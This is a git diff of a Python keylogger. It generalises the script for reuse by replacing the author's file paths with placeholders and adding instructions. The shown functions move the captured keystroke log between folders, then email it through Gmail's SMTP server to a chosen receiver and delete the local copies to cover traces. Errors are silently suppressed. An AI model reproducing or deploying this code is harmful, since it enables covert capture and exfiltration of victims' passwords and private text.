@@ -32,13 +32,13 @@ def key_logger ():
 def move():
     import os
     try:
-        z = open("C:/Users/nmkni/PycharmProjects/key log/log.txt", "r")
+        z = open("File path for saving text file 1", "r")# file 1 is generated text file by key logger
         x = z.read()
-        c = open("C:/Users/nmkni/PycharmProjects/key log/b/log.txt", "a")
+        c = open("file path for moving generated text file 2", "a") #file 2 is the copy of file 1 in another folder 
         c.write(x)
         z.close()
         c.close()
-        os.remove("C:/Users/nmkni/PycharmProjects/key log/log.txt")
+        os.remove("file path of file 1.txt")
     except:
         ''
 #Function for sending E-mail
@@ -47,17 +47,17 @@ def email():
     import smtplib
     from email.mime.text import MIMEText
     try:
-        filepath = 'C:/Users/nmkni/PycharmProjects/key log/b/log.txt'
+        filepath = 'FILE PATH OF FILE 2'
         with open(filepath, 'r') as f:
             text = MIMEText(f.read())
             text.add_header('',
                             '',
                             filename=os.path.basename(filepath))
 
-            s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+            s = smtplib.SMTP_SSL('smtp.gmail.com', 465) # IF YOU HAVE YAHOO OR OTHER ACCOUNT REPLACE SMTP.GMAIL.COM TO SMTP.OTHER.COM
             s.login('senders email address', 'senders email password ')
             s.sendmail('', 'Recivers email address', text.as_string())
-            os.remove("C:/Users/nmkni/PycharmProjects/key log/b/log.txt")
+            os.remove("FILE PATH OF FILE 2")
 
     except:
         ''
